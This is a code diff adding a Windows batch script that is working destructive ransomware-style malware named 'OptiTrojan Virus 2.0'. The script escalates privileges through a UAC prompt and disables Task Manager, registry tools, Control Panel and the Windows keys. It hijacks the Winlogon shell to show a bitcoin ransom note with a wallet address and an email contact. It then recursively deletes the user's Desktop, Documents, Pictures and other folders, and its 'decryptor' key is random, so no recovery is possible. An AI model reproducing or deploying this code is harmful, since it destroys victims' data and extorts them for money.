@@ -1,0 +1,175 @@
+@echo off
+
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+if '%errorlevel%' NEQ '0' (
+
+    echo Admin ...
+
+    goto UACPrompt
+
+) else ( goto gotAdmin )
+
+:UACPrompt
+
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+
+    set params = %*:"=""
+
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+
+
+    "%temp%\getadmin.vbs"
+
+    rem del "%temp%\getadmin.vbs"
+
+    exit /B
+
+
+
+:gotAdmin
+
+cls
+
+echo CreateObject("SAPI.SpVoice").Speak "Attnetion! Attention! Attention!" > %userprofile%\Appdata\Local\Temp\Voice.vbs
+echo do >> %userprofile%\Appdata\Local\Temp\Voice.vbs
+echo CreateObject("SAPI.SpVoice").Speak "Your important folders are deleted due to OptiTrojan!" >> %userprofile%\Appdata\Local\Temp\Voice.vbs
+echo loop >> %userprofile%\Appdata\Local\Temp\Voice.vbs
+
+cls
+
+echo @echo off > %userprofile%\Appdata\Local\Temp\Information.bat
+echo title Your computer was banned! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo Color 4f >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo mode con cols=125 lines=44 >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo cls >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo start %%userprofile%%\Appdata\Local\Temp\Voice.vbs >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo cls >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ======================================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ================================================= OptiTrojan Virus 2.0 ================================================= >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ======================================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo Q : What happened my computer? >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo A : Your important folders are deleted! desktop, downloads, documents etc.... >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo So, you can't use your Desktop, Downloads, Documents folder! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo But don't worry! You can recover your important folders anytime! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo Q : Can I recover my computer? >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo A : Yes, you can recover your computer and free! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo But you need to send bitcoin to recover your computer! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo You will busy to recover your computer! But don't waste your time! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo Anyone can't recover computer without special decryptor! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo Q : How to buy decryptor? >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo A : If you want to buy decryptor, you need to send bitcoin! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo So, send worth of 50$ or 0.004 bitcoin to this address : 12uwVDqzrPEaquSprYTvwkoTYwkiL5YxM3 >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo And also, you need to send decryptor serial key with your bitcoin wallet ID to KOR_TTTmap@protonmail.ch >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo So, after send bitcoin, send your own decryptor serial key with your bitcoin wallet ID to KOR_TTTmap@protonmail.ch! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo This is your decryptor serial key : %%random%%-%%random%%-%%random%%-%%random%%-%%random%% >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo Q : I sent my bitcoin! What can I do? >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo A : If you sent your bitcoin with decryptor serial key, you need to wait! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo And check your mail frequently! If checked payment, you will get decryptor from KOR_TTTmap@protonmail.ch mail! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo So, if you sent bitcoin and decryptor serial key, be patient! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ======================================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo And remember! Task Manager will disable until send your bitcoin, decryptor serial key! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo And, this message will appear again when you restart your computer! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo So..... Good Luck! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ======================================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ================================================= OptiTrojan Virus 2.0 ================================================= >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ======================================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo set /p password=Enter Here: >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo if "%%password%%" == %%random%%%%random%%%%random%%%%random%%%%random%% goto end >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo goto fail >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo :fail >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo Recover key is wrong! Try again! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo set /p password=Enter Here: >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo if "%%password%%" == %%random%%%%random%%%%random%%%%random%%%%random%% goto end >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo goto fail >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo :end >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo cls >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo title Decrypted! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo start explorer.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo Your computer was decrypted! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo If you want to disable Taskmanager, please Run this to Administrator : %%userprofile%%\Appdata\Local\Temp\EnableTaskMgr.bat >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo And you did great! Press any key to continue! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo pause >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo del /q %%userprofile%%\Appdata\Local\Temp\Information.bat >> %userprofile%\Appdata\Local\Temp\Information.bat
+
+cls
+
+echo @echo off > %userprofile%\Appdata\Local\Temp\EnableTaskMgr.bat
+echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f >> %userprofile%\Appdata\Local\Temp\EnableTaskMgr.bat
+echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 0 /f >> %userprofile%\Appdata\Local\Temp\EnableTaskMgr.bat
+echo shutdown -r -t 5 >> %userprofile%\Appdata\Local\Temp\EnableTaskMgr.bat
+
+cls
+
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d %userprofile%\Appdata\Local\Temp\Information.bat /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
+reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3} /v Restrict_Run /t REG_DWORD /d 1 /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search /v SearchboxTaskbarMode /t REG_DWORD /d 0 /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayContextMenu /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f
+
+cls
+
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
+
+cls
+
+echo rd %%userprofile%%\Desktop /s /q  > %userprofile%\Appdata\Local\Temp\DeleteDesktop.bat
+
+cls
+
+echo rd %%userprofile%%\Downloads /s /q > %userprofile%\Appdata\Local\Temp\DeleteDownloads.bat
+
+cls
+
+echo rd %%userprofile%%\Documents /s /q  > %userprofile%\Appdata\Local\Temp\DeleteDocuments.bat
+
+cls
+
+echo rd %%userprofile%%\Pictures /s /q  > %userprofile%\Appdata\Local\Temp\DeletePictures.bat
+
+cls
+
+echo rd %%userprofile%%\Videos /s /q > %userprofile%\Appdata\Local\Temp\DeleteVideos.bat
+
+cls
+
+echo rd %%userprofile%%\Music /s /q > %userprofile%\Appdata\Local\Temp\DeleteMusic.bat
+
+cls
+
+echo shutdown -r -f -t 5 > %userprofile%\Appdata\Local\Temp\Shutdown.bat
+
+cls
+
+start %userprofile%\Appdata\Local\Temp\DeleteDesktop.bat
+start %userprofile%\Appdata\Local\Temp\DeleteDownloads.bat
+start %userprofile%\Appdata\Local\Temp\DeleteDocuments.bat
+start %userprofile%\Appdata\Local\Temp\DeletePictures.bat
+start %userprofile%\Appdata\Local\Temp\DeleteVideos.bat
+start %userprofile%\Appdata\Local\Temp\DeleteMusic.bat
+
+cls
